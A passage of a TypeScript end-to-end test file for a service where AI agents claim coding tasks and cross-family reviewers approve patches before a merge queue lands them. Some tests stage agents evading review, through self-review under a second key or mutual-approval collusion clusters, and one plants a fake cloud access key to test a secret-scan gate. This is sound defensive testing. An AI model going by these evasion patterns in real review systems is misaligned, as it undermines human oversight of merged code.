// End-to-end over HTTP inside workerd (dev env, mock Artifacts hosted by the registry). Each test uses its
// own repository name. Merges are asynchronous (registry merge queue): tests drain the queue explicitly.
import { createExecutionContext, createMessageBatch, env, getQueueResult, runDurableObjectAlarm, runInDurableObject, SELF } from 'cloudflare:test';
import worker from '../src/index';
import { describe, expect, it } from 'vitest';
import { shardName, shardOf } from '../src/routing';

const ADMIN = env.ADMIN_KEY;
let seq = 0;
const repoName = () => `t${Date.now().toString(36)}${(seq++).toString(36)}`;

async function call(method: string, path: string, key?: string, body?: unknown) {
  const res = await SELF.fetch(`https://gf.test${path}`, {
    method,
    headers: { ...(key ? { Authorization: `Bearer ${key}` } : {}), ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}) },
    body: body === undefined ? undefined : typeof body === 'string' ? body : JSON.stringify(body),
  });
  const text = await res.text();
  return { status: res.status, body: JSON.parse(text), raw: text };
}

async function agent(agentId: string, role: 'worker' | 'reviewer', modelFamily: string) {
  const r = await call('POST', '/api/agents', ADMIN, { agentId, role, modelFamily });
  expect(r.status).toBe(201);
  return r.body.apiKey as string;
}

const SHARDS = 4;
async function setupRepo(tasks = ['T1', 'T2'], shards = SHARDS) {
  const repo = repoName();
  const r = await call('POST', `/api/repos/${repo}/init`, ADMIN, { tasks: tasks.map((id) => ({ id, title: `Task ${id}` })), shards });
  expect(r.status, r.raw).toBe(200);
  return repo;
}

const registry = (repo: string) => env.REPO_REGISTRY.get(env.REPO_REGISTRY.idFromName(repo));
const shardFor = (repo: string, taskId: string, shards = SHARDS) => env.REPO_COORDINATOR.get(env.REPO_COORDINATOR.idFromName(shardName(repo, shardOf(taskId, shards))));

async function drainQueue(repo: string) {
  for (let i = 0; i < 10; i++) if (!(await runDurableObjectAlarm(registry(repo)))) return;
}

async function status(repo: string) {
  return (await call('GET', `/api/repos/${repo}/status`)).body;
}

async function claimAndCommit(repo: string, key: string, taskId: string, files: Record<string, string | null>, opts: { rebase?: boolean } = {}) {
  expect((await call('POST', `/api/repos/${repo}/join`, key)).status).toBe(200);
  const c = await call('POST', `/api/repos/${repo}/claim`, key, { taskId });
  expect(c.status, c.raw).toBe(200);
  const d = await call('POST', `/api/repos/${repo}/dev-commit`, key, { taskId, leaseEpoch: c.body.leaseEpoch, files, message: `work on ${taskId}`, rebase: opts.rebase ?? false });
  expect(d.status, d.raw).toBe(200);
  return { epoch: c.body.leaseEpoch as number, sha: d.body.commitSha as string, claim: c.body };
}

async function submit(repo: string, key: string, taskId: string, w: { epoch: number; sha: string }) {
  const s = await call('POST', `/api/repos/${repo}/submit`, key, { taskId, leaseEpoch: w.epoch, commitSha: w.sha });
  expect(s.status, s.raw).toBe(200);
  return s.body as { patchId: string; status: string; baseCommit: string };
}

async function approve(repo: string, patchId: string, reviewers: string[]) {
  let last;
  for (const r of reviewers) last = await call('POST', `/api/repos/${repo}/attest`, r, { patchId, confidencePercent: 95 });
  return last!;
}

describe('auth and validation', () => {
  it('a revoked agent is refused at once (old keys), other agents are not, and a key issued later works', async () => {
    const repo = await setupRepo();
    const victim = await agent('w-revoked', 'worker', 'claude');
    const bystander = await agent('w-bystander', 'worker', 'claude');
    expect((await call('POST', `/api/repos/${repo}/join`, victim)).status).toBe(200);
    expect((await call('POST', '/api/agents/w-revoked/revoke', victim)).status).toBe(401); // admin only
    const r = await call('POST', '/api/agents/w-revoked/revoke', ADMIN);
    expect(r.status, r.raw).toBe(200);
    for (const [m, p, b] of [['POST', `/api/repos/${repo}/claim`, { taskId: 'T1' }], ['POST', `/api/repos/${repo}/join`, undefined], ['GET', '/api/whoami', undefined]] as const) {
      const res = await call(m, p, victim, b);
      expect(res.status, p).toBe(401);
      expect(res.body.error, p).toBe('KEY_REVOKED');
    }
    expect((await call('POST', `/api/repos/${repo}/join`, bystander)).status).toBe(200);
    await new Promise((res) => setTimeout(res, 1100)); // keys carry whole seconds; revocation covers its own second
    const fresh = await agent('w-revoked', 'worker', 'claude');
    expect((await call('POST', `/api/repos/${repo}/join`, fresh)).status).toBe(200);
  });

  it('the dashboard and its font are served same-origin (no third-party requests)', async () => {
    const page = await SELF.fetch('https://x/?repo=demo');
    const html = await page.text();
    expect(page.headers.get('content-security-policy')).toContain("default-src 'self'");
    expect(html).toContain("url('/fonts/inter.woff2')");
    expect(html).not.toMatch(/https?:\/\/(fonts\.googleapis|cdn|unpkg)/);
    const font = await SELF.fetch('https://x/fonts/inter.woff2');
    expect(font.status).toBe(200);
    expect(font.headers.get('content-type')).toBe('font/woff2');
    expect((await font.arrayBuffer()).byteLength).toBeGreaterThan(40_000);
  });

  it('the Artifacts load probe is not routed unless BENCH=1 on a native deployment', async () => {
    const r = await call('POST', '/api/bench/artifacts', ADMIN, { op: 'get', repo: 'x', n: 1 });
    expect(r.status).toBe(404);
  });

  it('rejects missing, forged and wrong-role keys; never 500 on malformed input', async () => {
    const repo = await setupRepo();
    const worker = await agent('w-auth', 'worker', 'claude');
    const reviewer = await agent('r-auth', 'reviewer', 'gemini');
    expect((await call('POST', `/api/repos/${repo}/claim`, undefined, { taskId: 'T1' })).status).toBe(401);
    expect((await call('POST', `/api/repos/${repo}/claim`, worker.slice(0, -3) + 'AAA', { taskId: 'T1' })).status).toBe(401);
    expect((await call('POST', `/api/repos/${repo}/claim`, reviewer, { taskId: 'T1' })).status).toBe(403);
    expect((await call('POST', `/api/repos/${repo}/attest`, worker, { patchId: 'p0_000000000000', confidencePercent: 90 })).status).toBe(403);
    expect((await call('POST', `/api/agents`, worker, { agentId: 'evil', role: 'reviewer' })).status).toBe(401);
    expect((await call('POST', `/api/repos/${repo}/init`, worker, {})).status).toBe(401);
    const malformed = await call('POST', `/api/repos/${repo}/claim`, worker, '{bad');
    expect(malformed.status).toBe(400);
    expect(malformed.body.error).toBe('VALIDATION_FAILED');
    expect((await call('POST', `/api/repos/${repo}/claim`, worker, { taskId: 'T1', agentId: 'someone-else' })).status).toBe(400);
    expect((await call('POST', `/api/repos/${repo}/claim`, worker, {})).status).toBe(400);
    expect((await call('POST', `/api/repos/${repo}/attest`, reviewer, { patchId: 'p0_000000000000', confidencePercent: 300 })).status).toBe(400);
    expect((await call('POST', `/api/repos/${repo}/attest`, reviewer, { patchId: 'p0_000000000000', confidencePercent: 85.5 })).status).toBe(400);
    expect((await call('POST', `/api/repos/${repo}/attest`, reviewer, { patchId: 'p99_000000000000', confidencePercent: 90 })).status).toBe(404);
    expect((await call('GET', `/api/repos/BAD_NAME/status`)).status).toBe(400);
    expect((await call('POST', `/api/repos/${repoName()}/claim`, worker, { taskId: 'T1' })).body.error).toBe('REPO_NOT_INITIALIZED');
  });
});

describe('sharding', () => {
  it('tasks are spread across shards and every claim is routed to the shard that owns the task', async () => {
    const ids = Array.from({ length: 40 }, (_, i) => `TASK-${i}`);
    const repo = repoName();
    const init = await call('POST', `/api/repos/${repo}/init`, ADMIN, { tasks: ids.map((id) => ({ id, title: id })), shards: 4 });
    expect(init.body.tasksPerShard.length).toBe(4);
    expect(init.body.tasksPerShard.every((n: number) => n > 0)).toBe(true);
    expect(init.body.tasks).toBe(40);
    const w = await agent('w-shard', 'worker', 'claude');
    expect((await call('POST', `/api/repos/${repo}/join`, w)).status).toBe(200);
    const picked = [0, 1, 2, 3, 4, 5, 6, 7].map((i) => ids[i]);
    for (const t of picked) expect((await call('POST', `/api/repos/${repo}/claim`, w, { taskId: t })).status).toBe(200);
    const s = await status(repo);
    expect(s.shards).toBe(4);
    expect(s.tasks.length).toBe(40);
    expect(s.tasks.filter((t: { status: string }) => t.status === 'claimed').map((t: { id: string }) => t.id).sort()).toEqual([...picked].sort());
    expect(new Set(picked.map((t) => shardOf(t, 4))).size).toBeGreaterThan(1);
  });

  it('DELETE /api/repos/:repo removes forks, main and all state; the name can be initialized again', async () => {
    const repo = await setupRepo(['D1', 'D2']);
    const w = await agent('w-del', 'worker', 'claude');
    await submit(repo, w, 'D1', await claimAndCommit(repo, w, 'D1', { 'd.txt': 'd\n' }));
    const fork = (await call('POST', `/api/repos/${repo}/join`, w)).body.fork.name;
    expect((await call('DELETE', `/api/repos/${repo}`, w)).status).toBe(401);
    const del = await call('DELETE', `/api/repos/${repo}`, ADMIN);
    expect(del.status, del.raw).toBe(200);
    expect(del.body).toMatchObject({ done: true, deletedForks: 1, remainingForks: 0 });
    const left = await runInDurableObject(registry(repo), async (instance) => {
      const repos = (instance as unknown as { artifacts: { repos: Map<string, unknown> } }).artifacts.repos;
      return [repos.has(fork.toLowerCase()), repos.has(repo)];
    });
    expect(left).toEqual([false, false]); // fork and main are gone from (mock) Artifacts
    expect(await status(repo)).toMatchObject({ repo: null, tasks: [], patches: [] });
    expect((await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'D2' })).status).toBe(404);
    expect((await call('DELETE', `/api/repos/${repo}`, ADMIN)).body.done).toBe(true); // idempotent
    const again = await call('POST', `/api/repos/${repo}/init`, ADMIN, { tasks: [{ id: 'N1', title: 'new' }], shards: 2 });
    expect(again.status, again.raw).toBe(200);
    expect((await status(repo)).tasks.map((t: { id: string }) => t.id)).toEqual(['N1']);
    const joined = await call('POST', `/api/repos/${repo}/join`, w);
    expect(joined.body.fork.name).toBe(fork); // same deterministic name, provisioned afresh
  });

  it('no joins while a repository is being deleted', async () => {
    const repo = await setupRepo(['X1']);
    await runInDurableObject(registry(repo), async (instance) => {
      const r = instance as unknown as { config: { deleting?: boolean } };
      r.config.deleting = true;
    });
    const j = await call('POST', `/api/repos/${repo}/join`, await agent('w-deleting', 'worker', 'claude'));
    expect(j.status).toBe(409);
    expect(j.body.error).toBe('REPO_DELETING');
  });

  it('the shard count of a repository is immutable', async () => {
    const repo = await setupRepo(['T1'], 2);
    const again = await call('POST', `/api/repos/${repo}/init`, ADMIN, { tasks: [], shards: 3 });
    expect(again.status).toBe(409);
    expect(again.body.error).toBe('SHARDS_IMMUTABLE');
  });
});

describe('claims', () => {
  it('30 concurrent claims on one task with slow external I/O grant exactly one lease', async () => {
    const repo = await setupRepo(['RACE']);
    const keys: string[] = [];
    for (let i = 0; i < 30; i++) {
      const k = await agent(`racer-${String.fromCharCode(97 + (i % 26))}${i}-x`, 'worker', `fam${i % 3}`);
      expect((await call('POST', `/api/repos/${repo}/join`, k)).status).toBe(200);
      keys.push(k);
    }
    await registry(repo).devConfigureMock({ latencyMs: 25 });
    const results = await Promise.all(keys.map((k) => call('POST', `/api/repos/${repo}/claim`, k, { taskId: 'RACE' })));
    expect(results.filter((r) => r.status === 200).length).toBe(1);
    expect(results.filter((r) => r.body.error === 'ALREADY_CLAIMED').length).toBe(29);
    await registry(repo).devConfigureMock({ latencyMs: 0 });
  });

  it('write credentials come only from /join and are never stored; status carries none', async () => {
    const repo = await setupRepo();
    const w = await agent('w-sec', 'worker', 'claude');
    const join = await call('POST', `/api/repos/${repo}/join`, w);
    expect(join.body.fork.token).toMatch(/^mock_write_/);
    const { claim } = await claimAndCommit(repo, w, 'T1', { 'a.txt': 'x\n' });
    expect(claim.fork.token).toBeUndefined();
    expect(claim.main.readToken).toMatch(/^mock_read_/);
    expect((await call('GET', `/api/repos/${repo}/status`)).raw).not.toMatch(/mock_(write|read)_/);
    const again = await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'T1' });
    expect(again.status).toBe(409);
    expect(again.body.error).toBe('ALREADY_HOLDER');
    expect(again.raw).not.toMatch(/mock_/);
    const stored = await runInDurableObject(shardFor(repo, 'T1'), async (_i, state) => JSON.stringify([...(await state.storage.list()).entries()]));
    expect(stored).not.toMatch(/mock_(write|read)_/);
    const inMemory = await runInDurableObject(shardFor(repo, 'T1'), async (instance) => JSON.stringify([...(instance as unknown as { tasks: Map<string, unknown> }).tasks.values()]));
    expect(inMemory).not.toMatch(/mock_(write|read)_/);
    const registryStored = await runInDurableObject(registry(repo), async (_i, state) => JSON.stringify([...(await state.storage.list()).entries()]));
    expect(registryStored).not.toMatch(/mock_(write|read)_/);
  });

  it('claims make no per-claim Artifacts calls: 20 claims share one read token and mint no write token', async () => {
    const tasks = Array.from({ length: 20 }, (_, i) => `C${i}`);
    const repo = await setupRepo(tasks, 1);
    const keys: string[] = [];
    for (const t of tasks) {
      const k = await agent(`w-b1-${t}`, 'worker', 'claude');
      expect((await call('POST', `/api/repos/${repo}/join`, k)).status).toBe(200);
      keys.push(k);
    }
    const claims = await Promise.all(tasks.map((t, i) => call('POST', `/api/repos/${repo}/claim`, keys[i], { taskId: t })));
    expect(claims.every((c) => c.status === 200)).toBe(true);
    expect(new Set(claims.map((c) => c.body.main.readToken)).size).toBe(1);
    const tokens = ((await registry(repo).devConfigureMock({})) as { activeTokens: Record<string, number> }).activeTokens;
    expect(tokens[repo]).toBe(1); // the shard's shared read token
    for (const [name, n] of Object.entries(tokens)) if (name !== repo) expect(n, name).toBe(1); // the token from /join
  });

  it('main head is cached for claims, and dropped when a patch of the shard merges', async () => {
    const repo = await setupRepo(['H1', 'H2', 'H3'], 1);
    const w = await agent('w-head', 'worker', 'claude');
    const r1 = await agent('r-head-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-head-2', 'reviewer', 'gemini');
    const first = await claimAndCommit(repo, w, 'H1', { 'h1.txt': '1\n' });
    await registry(repo).devConfigureMock({ failNext: { head: 'unavailable' } });
    const cached = await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'H2' });
    expect(cached.status, 'served from the head cache').toBe(200);
    expect(cached.body.baseCommit).toBe(first.claim.baseCommit);
    await registry(repo).devConfigureMock({ failNext: {} });
    await approve(repo, (await submit(repo, w, 'H1', first)).patchId, [r1, r2]);
    await drainQueue(repo);
    const merged = (await status(repo)).tasks.find((t: { id: string }) => t.id === 'H1').mergedCommit;
    expect(merged).toMatch(/^[0-9a-f]{40}$/);
    const after = await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'H3' });
    expect(after.body.baseCommit).toBe(merged);
  });

  it('join mints a fresh fork token each call and recovers from a failed mint', async () => {
    const repo = await setupRepo();
    const w = await agent('w-join', 'worker', 'claude');
    await call('POST', `/api/repos/${repo}/join`, w); // provisions the fork
    await registry(repo).devConfigureMock({ failNext: { 'mintToken:write': 'quota exceeded' } });
    const failed = await call('POST', `/api/repos/${repo}/join`, w);
    expect(failed.status).toBe(502);
    expect(failed.body.error).toBe('FORK_TOKEN_FAILED');
    const a = await call('POST', `/api/repos/${repo}/join`, w);
    const b = await call('POST', `/api/repos/${repo}/join`, w);
    expect(a.status).toBe(200);
    expect(a.body.fork.name).toBe(b.body.fork.name);
    expect(a.body.fork.token).not.toBe(b.body.fork.token);
    expect(Date.parse(a.body.fork.tokenExpiresAt)).toBeGreaterThan(Date.now() + 3000_000);
  });

  it('a provisioning failure (head or shared read token) rolls back, counts nothing, and the next claim works', async () => {
    for (const failing of ['head', 'mintToken:read'] as const) {
      const repo = await setupRepo();
      const w = await agent(`w-fail-${failing.slice(-4)}`, 'worker', 'claude');
      expect((await call('POST', `/api/repos/${repo}/join`, w)).status).toBe(200);
      await registry(repo).devConfigureMock({ failNext: { [failing]: 'quota exceeded' } });
      const r = await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'T1' });
      expect(r.status).toBe(502);
      expect(r.body.error).toBe('PROVISIONING_FAILED');
      const s = await status(repo);
      expect(s.tasks.find((t: { id: string }) => t.id === 'T1').status).toBe('available');
      expect(s.stats.claims).toBe(0);
      expect((await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'T1' })).status, failing).toBe(200);
    }
  });

  it('fencing token rejects a stale epoch after the lease moved on', async () => {
    const repo = await setupRepo();
    const a = await agent('w-fence-a', 'worker', 'claude');
    const b = await agent('w-fence-b', 'worker', 'gemini');
    const first = await claimAndCommit(repo, a, 'T1', { 'f.txt': 'a\n' });
    await runInDurableObject(shardFor(repo, 'T1'), async (instance) => {
      (instance as unknown as { tasks: Map<string, { leaseExpiresAt: number }> }).tasks.get('T1')!.leaseExpiresAt = Date.now() - 1;
    });
    expect((await call('POST', `/api/repos/${repo}/join`, b)).status).toBe(200);
    const second = await call('POST', `/api/repos/${repo}/claim`, b, { taskId: 'T1' });
    expect(second.status).toBe(200);
    expect(second.body.leaseEpoch).toBe(first.epoch + 1);
    const late = await call('POST', `/api/repos/${repo}/submit`, a, { taskId: 'T1', leaseEpoch: first.epoch, commitSha: first.sha });
    expect(late.status).toBe(403);
    expect(late.body.error).toBe('NOT_LEASE_HOLDER');
    expect((await call('POST', `/api/repos/${repo}/heartbeat`, b, { taskId: 'T1', leaseEpoch: first.epoch })).body.error).toBe('STALE_LEASE_EPOCH');
  });

  it('healer: an expired lease is reclaimed by the shard alarm', async () => {
    const repo = await setupRepo();
    const w = await agent('w-heal', 'worker', 'claude');
    await claimAndCommit(repo, w, 'T1', { 'h.txt': 'x\n' });
    await runInDurableObject(shardFor(repo, 'T1'), async (instance) => {
      (instance as unknown as { tasks: Map<string, { leaseExpiresAt: number }> }).tasks.get('T1')!.leaseExpiresAt = Date.now() - 1;
    });
    expect(await runDurableObjectAlarm(shardFor(repo, 'T1'))).toBe(true);
    const s = await status(repo);
    expect(s.tasks.find((t: { id: string }) => t.id === 'T1').status).toBe('available');
    expect(s.stats.leasesReclaimed).toBe(1);
  });
});

describe('submit and review', () => {
  it('a shard keeps only a per-file summary in memory; the full change is read from storage for the diff', async () => {
    const repo = await setupRepo(['M1']);
    const w = await agent('w-mem', 'worker', 'claude');
    const r1 = await agent('r-mem', 'reviewer', 'gpt-4o');
    const marker = 'export const marker = "only-in-storage-7f3a";';
    const sub = await submit(repo, w, 'M1', await claimAndCommit(repo, w, 'M1', { 'src/m.ts': `${marker}\n` }));
    const memory = await runInDurableObject(shardFor(repo, 'M1'), async (instance) => JSON.stringify([...(instance as unknown as { patches: Map<string, unknown> }).patches.values()]));
    expect(memory).not.toContain('only-in-storage-7f3a');
    expect(memory).toContain('"files":[{"path":"src/m.ts"');
    const diff = await call('GET', `/api/repos/${repo}/patches/${sub.patchId}/diff`, r1);
    expect(diff.body.patch.changes[0].added).toContain(marker);
  });

  it('patches stored by earlier builds (change inside the record) are split on load; 10,000 patches reload', async () => {
    const repo = await setupRepo(['Z1', 'Z2']);
    const stub = shardFor(repo, 'Z1');
    const N = 10_000;
    await runInDurableObject(stub, async (_i, state) => {
      const base = { taskId: 'Z1', author: 'w-old', authorFamily: 'claude', fork: 'f', commitSha: 'a'.repeat(40), baseCommit: 'b'.repeat(40), leaseEpoch: 1, status: 'merged', gates: [], simHash: '0'.repeat(64), similar: [], reviews: [] };
      for (let i = 0; i < N; i += 128) {
        const batch: Record<string, unknown> = {};
        for (let j = i; j < Math.min(N, i + 128); j++) {
          const patchId = `p0_${j.toString(16).padStart(12, '0')}`;
          batch[`patch:${patchId}`] = { ...base, patchId, submittedAt: j, changes: [{ path: `f${j}.ts`, status: 'added', binary: false, added: [`line ${j} legacy-content`], removed: [], blob: { hash: 'c'.repeat(40), mode: '100644' } }] };
        }
        await state.storage.put(batch);
      }
    });
    await runInDurableObject(stub, async (_i, state) => state.abort()).catch(() => {});
    const fresh = shardFor(repo, 'Z1');
    const memory = await runInDurableObject(fresh, async (instance) => {
      const patches = [...(instance as unknown as { patches: Map<string, { files: unknown[]; changes?: unknown }> }).patches.values()];
      return { n: patches.length, withChanges: patches.filter((p) => p.changes).length, withFiles: patches.filter((p) => p.files?.length === 1).length };
    });
    expect(memory).toEqual({ n: N, withChanges: 0, withFiles: N });
    const stored = await runInDurableObject(fresh, async (_i, state) => (await state.storage.list({ prefix: 'pchg:' })).size);
    expect(stored).toBe(N);
    const s = await status(repo);
    expect(s.patches.length).toBeGreaterThan(0);
    const w = await agent('w-z', 'worker', 'claude');
    expect((await submit(repo, w, 'Z1', await claimAndCommit(repo, w, 'Z1', { 'z.ts': 'z\n' }))).status).toBe('evaluating');
  });

  it('review edges written by earlier builds as one value are moved to one key per edge', async () => {
    const repo = await setupRepo();
    const stub = registry(repo);
    await runInDurableObject(stub, async (_i, state) => {
      await state.storage.put('edges', { 'r-old\u0000w-x': 2, 'w-x\u0000r-old': 1 });
    });
    // A fresh instance runs the constructor again (the migration), as after a deploy.
    await runInDurableObject(stub, async (_i, state) => {
      state.abort();
    }).catch(() => {});
    const fresh = registry(repo); // a stub on an aborted object stays broken: take a new one
    const excluded = await fresh.recordReview('r-new', 'w-x', true);
    expect(excluded).toEqual(['r-old']); // the old mutual pair is still a collusion cluster
    const keys = await runInDurableObject(fresh, async (_i, state) => [...(await state.storage.list({ prefix: 'edge' })).keys()].sort());
    expect(keys).toEqual(['edge:r-new\u0000w-x', 'edge:r-old\u0000w-x', 'edge:w-x\u0000r-old']);
  });

  it('full flow: server-side diff, gates, 2-family quorum, the queue lands its own commit of the reviewed tree; terminal afterwards', async () => {
    const repo = await setupRepo();
    const w = await agent('w-flow', 'worker', 'claude');
    const r1 = await agent('r-flow-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-flow-2', 'reviewer', 'gemini');
    const work = await claimAndCommit(repo, w, 'T1', { 'src/clamp.ts': 'export const clamp = (x: number, lo: number, hi: number) => Math.min(hi, Math.max(lo, x));\n' });
    const sub = await submit(repo, w, 'T1', work);
    expect(sub.status).toBe('evaluating');
    expect(sub.patchId).toMatch(new RegExp(`^p${shardOf('T1', SHARDS)}_`));
    const diff = await call('GET', `/api/repos/${repo}/patches/${sub.patchId}/diff`, r1);
    expect(diff.body.patch.changes[0].path).toBe('src/clamp.ts');

    expect((await call('POST', `/api/repos/${repo}/attest`, r1, { patchId: sub.patchId, confidencePercent: 95, reasoning: 'ok' })).body.status).toBe('evaluating');
    expect((await call('POST', `/api/repos/${repo}/attest`, r1, { patchId: sub.patchId, confidencePercent: 95 })).body.error).toBe('ALREADY_REVIEWED');
    expect((await call('POST', `/api/repos/${repo}/attest`, r2, { patchId: sub.patchId, confidencePercent: 95 })).body.status).toBe('queued');
    expect((await call('POST', `/api/repos/${repo}/attest`, await agent('r-busy', 'reviewer', 'mistral'), { patchId: sub.patchId, confidencePercent: 95 })).body.error).toBe('PATCH_QUEUED');

    await drainQueue(repo);
    const s = await status(repo);
    const t1 = s.tasks.find((t: { id: string }) => t.id === 'T1');
    expect(t1.status).toBe('merged');
    // Never the agent's commit, even though it descends from main: its tree and history may hold more than the diff.
    expect(t1.mergedCommit).not.toBe(work.sha);
    expect(s.patches[0].mergedVia).toBe('batch');
    expect(s.queue.fastForwards).toBe(0);
    expect((await registry(repo).devMainFiles())!['src/clamp.ts']).toBe('export const clamp = (x: number, lo: number, hi: number) => Math.min(hi, Math.max(lo, x));\n');
    expect((await call('POST', `/api/repos/${repo}/release`, w, { taskId: 'T1', leaseEpoch: work.epoch })).body.error).toBe('TASK_NOT_CLAIMED');
    expect((await call('POST', `/api/repos/${repo}/submit`, w, { taskId: 'T1', leaseEpoch: work.epoch, commitSha: work.sha })).body.error).toBe('TASK_NOT_CLAIMED');
    expect((await call('POST', `/api/repos/${repo}/attest`, await agent('r-late', 'reviewer', 'llama'), { patchId: sub.patchId, confidencePercent: 1 })).body.error).toBe('PATCH_TERMINAL');
    expect((await call('POST', `/api/repos/${repo}/claim`, w, { taskId: 'T1' })).body.error).toBe('TASK_NOT_AVAILABLE');
  });

  it('a gate failure on the server-computed diff rejects immediately and frees the task', async () => {
    const repo = await setupRepo();
    const w = await agent('w-gate', 'worker', 'claude');
    const sub = await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', { 'src/cfg.ts': 'export const key = "AKIAABCDEFGHIJKLMNOP";\n' })); // gitleaks:allow (fake key: the secret-scan gate must catch it)
    expect(sub.status).toBe('rejected');
    expect((await status(repo)).tasks.find((t: { id: string }) => t.id === 'T1').status).toBe('available');
  });

  it('unknown commits are refused; agents cannot send diffs', async () => {
    const repo = await setupRepo();
    const w = await agent('w-sha', 'worker', 'claude');
    const { epoch } = await claimAndCommit(repo, w, 'T1', { 'x.txt': 'x\n' });
    const r = await call('POST', `/api/repos/${repo}/submit`, w, { taskId: 'T1', leaseEpoch: epoch, commitSha: 'f'.repeat(40) });
    expect(r.status).toBe(404);
    expect(r.body.error).toBe('COMMIT_NOT_FOUND_IN_FORK');
    expect((await call('POST', `/api/repos/${repo}/submit`, w, { taskId: 'T1', leaseEpoch: epoch, diffText: '+ x' })).status).toBe(400);
  });

  it('self-review is refused even with a second key for the same agent id', async () => {
    const repo = await setupRepo();
    const w = await agent('w-self', 'worker', 'claude');
    const selfReviewer = await agent('w-self', 'reviewer', 'claude');
    const sub = await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', { 's.txt': 's\n' }));
    const r = await call('POST', `/api/repos/${repo}/attest`, selfReviewer, { patchId: sub.patchId, confidencePercent: 99 });
    expect(r.status).toBe(403);
    expect(r.body.error).toBe('CANNOT_REVIEW_OWN_PATCH');
  });

  it('resubmitting a change already rejected on the same task is a duplicate', async () => {
    const repo = await setupRepo();
    const w = await agent('w-dup', 'worker', 'claude');
    const n1 = await agent('r-dup-1', 'reviewer', 'gpt-4o');
    const n2 = await agent('r-dup-2', 'reviewer', 'gemini');
    const files = { 'src/x.ts': 'export const x = 1;\n' };
    const p1 = (await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', files))).patchId;
    await call('POST', `/api/repos/${repo}/attest`, n1, { patchId: p1, confidencePercent: 5 });
    expect((await call('POST', `/api/repos/${repo}/attest`, n2, { patchId: p1, confidencePercent: 5 })).body.status).toBe('rejected');
    const s2 = await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', files));
    expect(s2.status).toBe('duplicate');
  });

  it('a resubmission with small edits goes to review flagged as near-duplicate; a different change is not flagged', async () => {
    const repo = await setupRepo(['T1']);
    const w = await agent('w-near', 'worker', 'claude');
    const n1 = await agent('r-near-1', 'reviewer', 'gpt-4o');
    const n2 = await agent('r-near-2', 'reviewer', 'gemini');
    const body = Array.from({ length: 30 }, (_, i) => `export const value${i} = compute(${i}, 'item-${i}');`).join('\n') + '\n';
    const p1 = (await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', { 'src/values.ts': body }))).patchId;
    await call('POST', `/api/repos/${repo}/attest`, n1, { patchId: p1, confidencePercent: 5 });
    expect((await call('POST', `/api/repos/${repo}/attest`, n2, { patchId: p1, confidencePercent: 5 })).body.status).toBe('rejected');
    const edited = await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', { 'src/values.ts': '// cleaned up\n' + body }));
    expect(edited.status).toBe('evaluating');
    expect((edited as { nearDuplicateOf?: { patchId: string; distance: number } }).nearDuplicateOf?.patchId).toBe(p1);
    const diff = await call('GET', `/api/repos/${repo}/patches/${edited.patchId}/diff`, n1);
    expect(diff.body.patch.nearDuplicateOf.patchId).toBe(p1);
    expect(diff.body.patch.nearDuplicateOf.distance).toBeLessThanOrEqual(14);
    await call('POST', `/api/repos/${repo}/attest`, n1, { patchId: edited.patchId, confidencePercent: 5 });
    await call('POST', `/api/repos/${repo}/attest`, n2, { patchId: edited.patchId, confidencePercent: 5 });
    const other = await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', { 'docs/guide.md': '# Guide\n\nA different change altogether, in another file.\n' }));
    expect(other.status).toBe('evaluating');
    expect((other as { nearDuplicateOf?: unknown }).nearDuplicateOf).toBeUndefined();
  });

  it('collusion clusters span shards: approvals inside a mutual-approval cluster with the author are excluded', async () => {
    const tasks = ['T1', 'T2', 'T3', 'T4', 'T5', 'T6'];
    const repo = await setupRepo(tasks);
    const [ta, tb] = (() => {
      for (const a of tasks) for (const b of tasks) if (shardOf(a, SHARDS) !== shardOf(b, SHARDS)) return [a, b];
      throw new Error('no cross-shard pair');
    })();
    const xw = await agent('x', 'worker', 'claude');
    const xr = await agent('x', 'reviewer', 'claude');
    const yw = await agent('y', 'worker', 'gemini');
    const yr = await agent('y', 'reviewer', 'gemini');
    const z = await agent('z', 'reviewer', 'gpt-4o');
    const patchY = (await submit(repo, yw, tb, await claimAndCommit(repo, yw, tb, { 'y.txt': 'y\n' }))).patchId;
    await call('POST', `/api/repos/${repo}/attest`, xr, { patchId: patchY, confidencePercent: 95 });
    const patchX = (await submit(repo, xw, ta, await claimAndCommit(repo, xw, ta, { 'x.txt': 'x\n' }))).patchId;
    await call('POST', `/api/repos/${repo}/attest`, yr, { patchId: patchX, confidencePercent: 95 });
    const r = await call('POST', `/api/repos/${repo}/attest`, z, { patchId: patchX, confidencePercent: 95 });
    expect(r.body.status).toBe('evaluating');
    expect(r.body.evaluation.excluded).toEqual([{ reviewerId: 'y', reason: 'COLLUSION_CLUSTER_WITH_AUTHOR' }]);
  });

  it('review timeout: an unreviewed patch expires and frees its task', async () => {
    const repo = await setupRepo();
    const w = await agent('w-exp', 'worker', 'claude');
    const pid = (await submit(repo, w, 'T1', await claimAndCommit(repo, w, 'T1', { 'e.txt': 'e\n' }))).patchId;
    await runInDurableObject(shardFor(repo, 'T1'), async (instance) => {
      (instance as unknown as { patches: Map<string, { submittedAt: number }> }).patches.get(pid)!.submittedAt = Date.now() - 31 * 60_000;
    });
    expect(await runDurableObjectAlarm(shardFor(repo, 'T1'))).toBe(true);
    const s = await status(repo);
    expect(s.patches[0].status).toBe('expired');
    expect(s.tasks.find((t: { id: string }) => t.id === 'T1').status).toBe('available');
  });
});

describe('merge queue', () => {
  it('disjoint patches built on an old main still merge (composed commit), and main contains both changes', async () => {
    const repo = await setupRepo(['T1', 'T2']);
    const wa = await agent('w-q-a', 'worker', 'claude');
    const wb = await agent('w-q-b', 'worker', 'gemini');
    const r1 = await agent('r-q-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-q-2', 'reviewer', 'mistral');
    const a = await claimAndCommit(repo, wa, 'T1', { 'src/a.ts': 'export const a = 1;\n' });
